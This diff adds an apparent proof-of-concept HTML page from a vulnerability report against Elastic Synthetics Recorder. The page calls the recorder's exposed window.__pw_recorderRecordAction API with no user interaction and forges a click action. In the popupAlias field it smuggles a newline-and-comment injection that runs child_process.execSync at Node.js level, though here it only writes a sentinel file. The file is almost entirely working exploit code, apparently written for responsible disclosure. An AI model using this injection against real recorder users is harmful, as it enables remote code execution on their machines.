@@ -1,0 +1,58 @@
+<!--
+PS-01 PoC attachment — the "attacker's website."
+
+Host this file anywhere (or open it as a local file:// URL) and record it
+in Synthetics Recorder. No user interaction on the page is required; the
+script fires automatically once the recorder has instrumented the frame.
+
+This demonstrates the DELIVERY mechanism only (forging a recorder action
+via the exposed window.__pw_recorderRecordAction API). See the attached
+poc-generator-harness.js and poc-generator-harness-output.txt for
+independent verification that the resulting generated code actually
+executes as real Node.js when the victim clicks "Test" — that harness
+calls the exact same unmodified @elastic/synthetics generator and CLI
+execution mechanism the app itself uses.
+-->
+<html>
+<body>
+<div>Totally ordinary-looking page</div>
+<script>
+  function tryFire() {
+    if (typeof window.__pw_recorderRecordAction === 'function') {
+      // window.__pw_recorderRecordAction(action) forwards `action` DIRECTLY
+      // as the flat Action object to the server-side recorder — it must
+      // NOT be wrapped in an extra {frame, action} layer. The `frame` half
+      // of ActionInContext is computed server-side from the calling frame,
+      // not supplied by the caller.
+      window.__pw_recorderRecordAction({
+        name: 'click',
+        selector: 'body',
+        button: 'left',
+        clickCount: 1,
+        modifiers: 0,
+        signals: [
+          {
+            name: 'popup',
+            isAsync: false,
+            // Breaks out of the intended identifier position using a
+            // newline + line comment. Plain `require` is not in lexical
+            // scope inside the CLI's inline-script execution wrapper
+            // (confirmed independently); process.mainModule.require
+            // works and still proves genuine Node.js-level execution,
+            // not merely a sandboxed JS eval. Writes a sentinel file into
+            // the OS temp directory (portable across machines, not
+            // hardcoded to any one tester's path) so execution can be
+            // verified independently of watching the app's own UI.
+            popupAlias:
+              "x=((function(){var cp=process.mainModule.require('child_process');var os=process.mainModule.require('os');var pth=process.mainModule.require('path');var p=pth.join(os.tmpdir(),'ps01_sentinel.txt');cp.execSync('echo popupAlias_RCE_'+Date.now()+' > '+p);})(),0)\n//",
+          },
+        ],
+      });
+    } else {
+      setTimeout(tryFire, 100);
+    }
+  }
+  tryFire();
+</script>
+</body>
+</html>
